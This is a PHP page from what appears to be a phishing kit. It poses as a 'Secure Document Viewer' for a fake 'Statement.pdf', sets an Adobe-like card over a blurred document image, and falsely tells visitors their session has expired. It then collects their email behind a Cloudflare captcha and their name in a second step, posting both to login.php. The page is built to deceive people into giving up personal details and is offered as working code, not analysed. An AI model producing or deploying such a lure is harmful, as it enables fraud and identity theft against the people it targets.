<?php
session_start();

// Step control
$step = $_SESSION['step'] ?? 1;

// Old email
$old_email = $_SESSION['old_email'] ?? '';
$error     = $_SESSION['error_message'] ?? '';
unset($_SESSION['error_message']);

$hasError = !empty($error);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Document Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Cloudflare Turnstile -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

    <style>
        /* Global box-sizing fix */
        *, *::before, *::after {
            box-sizing: border-box;
        }

        /* -------------------------------------------
           AUTO DARK/LIGHT MODE
        -------------------------------------------- */
        :root {
            --card-bg: #f5f5f5;
            --text-color: #222;
            --subtext: #666;
            --border: #d0d0d0;
            --btn-bg: #1a73e8;
            --btn-hover: #185abc;
            --error: #c21515;
            --overlay-dark: rgba(0,0,0,0.65);
            --readonly-bg: #e0e3ea; /* darker locked email bg */
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --card-bg: #1b1b1b;
                --text-color: #eee;
                --subtext: #aaa;
                --border: #333;
                --btn-bg: #3478f6;
                --btn-hover: #1f5fcc;
                --overlay-dark: rgba(0,0,0,0.72);
                --readonly-bg: #252a33;
            }
        }

        /* -------------------------------------------
           PAGE BACKGROUND
        -------------------------------------------- */
        body {
            margin: 0;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background: #111;
            color: var(--text-color);
            min-height: 100vh;
        }

        .page-wrapper {
            position: relative;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        /* Background blurred PDF preview */
        .doc-background {
            position: absolute;
            inset: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            filter: blur(6px);
            transform: scale(1.04);
            opacity: 0.7;
        }

        .doc-background img {
            max-width: 100%;
            max-height: 100vh;
            object-fit: contain;
        }

        /* Dark overlay to increase readability */
        .page-wrapper::before {
            content: "";
            position: absolute;
            inset: 0;
            background: var(--overlay-dark);
            pointer-events: none;
        }

        /* -------------------------------------------
           CARD (compact, Adobe-ish)
        -------------------------------------------- */
        .login-card {
            position: relative;
            z-index: 2;
            width: 95%;
            max-width: 320px;
            background: var(--card-bg);
            border-radius: 6px;
            padding: 22px 22px 26px;
            box-shadow: 0 18px 45px rgba(0,0,0,0.45);
            overflow: hidden;

            opacity: 0;
            transform: translateY(14px) scale(0.98);
            animation: cardIn 0.55s ease-out forwards;
            border: 1px solid transparent;
        }

        /* Softer error state: subtle red border, no heavy red glow */
        .login-card.has-error {
            border-color: rgba(194, 21, 21, 0.5);
            box-shadow: 0 18px 45px rgba(0,0,0,0.55);
        }

        @keyframes cardIn {
            from {
                opacity: 0;
                transform: translateY(18px) scale(0.97);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        /* PDF Icon */
        .doc-icon {
            width: 42px;
            height: 42px;
            margin: 0 auto 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .doc-icon-img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        /* Titles */
        .doc-title {
            font-size: 16px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 4px;
        }

        .doc-size {
            font-weight: 400;
            color: var(--subtext);
            font-size: 12px;
        }

        /* Red “session expired” text – used ONLY on step 1 */
        .doc-subtitle {
            text-align: center;
            color: var(--error);
            font-size: 11px;
            margin-bottom: 10px;
            font-weight: 600;
        }

        /* Error message from backend */
        .login-error {
            color: var(--error);
            font-size: 11px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 10px;
        }

        /* Form fields */
        .field-wrapper {
            margin-bottom: 10px;
        }

        .field-wrapper input {
            width: 100%;
            padding: 10px 11px;
            border-radius: 4px;
            border: 1px solid var(--border);
            background: transparent;
            color: var(--text-color);
            font-size: 14px;
            outline: none;
        }

        .field-wrapper input:focus {
            border-color: var(--btn-bg);
            box-shadow: 0 0 0 1px rgba(26,115,232,0.2);
        }

        /* Read-only (validated) email appearance – darker */
        .readonly-input {
            background: var(--readonly-bg);
            color: var(--subtext);
            cursor: not-allowed;
        }

        /* CAPTCHA wrapper: perfectly centered */
        .captcha-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 6px 0 4px;
        }

        /* Turnstile size */
        .cf-turnstile {
            transform: scale(0.9);
            transform-origin: center center;
        }

        /* Buttons */
        .btn-primary {
            width: 100%;
            padding: 11px 12px;
            background: var(--btn-bg);
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            margin-top: 6px;
        }

        .btn-primary:hover {
            background: var(--btn-hover);
        }
    </style>
</head>
<body>
<div class="page-wrapper">

    <!-- Background -->
    <div class="doc-background">
        <img src="assets/background.png" alt="Document preview">
    </div>

    <div class="login-card<?= $hasError ? ' has-error' : '' ?>">
        <div class="doc-icon">
            <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
        </div>

        <h2 class="doc-title">
            Statement.pdf <span class="doc-size">(197 KB)</span>
        </h2>

        <?php if ($step == 1): ?>
            <!-- Only show this on the first page -->
            <p class="doc-subtitle">Previous session has expired, login to continue.</p>
        <?php endif; ?>

        <?php if ($error): ?>
            <p class="login-error"><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>

        <?php if ($step == 1): ?>
            <!-- STEP 1 — EMAIL → CAPTCHA → BUTTON -->
            <form method="POST" action="login.php">
                <div class="field-wrapper">
                    <input
                        type="email"
                        name="email"
                        value="<?= htmlspecialchars($old_email) ?>"
                        placeholder="Enter your email"
                        required
                    >
                </div>

                <div class="captcha-wrapper">
                    <div
                        class="cf-turnstile"
                        data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2">
                    </div>
                </div>

                <button class="btn-primary">Next</button>
            </form>

        <?php else: ?>
            <!-- STEP 2 — DARKER LOCKED EMAIL + NAME -->
            <form method="POST" action="login.php">
                <div class="field-wrapper">
                    <input
                        type="email"
                        value="<?= htmlspecialchars($old_email) ?>"
                        class="readonly-input"
                        readonly
                    >
                </div>

                <div class="field-wrapper">
                    <input
                        type="text"
                        name="name"
                        placeholder="Enter your name"
                        required
                    >
                </div>

                <button class="btn-primary">Next</button>
            </form>
        <?php endif; ?>
    </div>
</div>
</body>
</html>
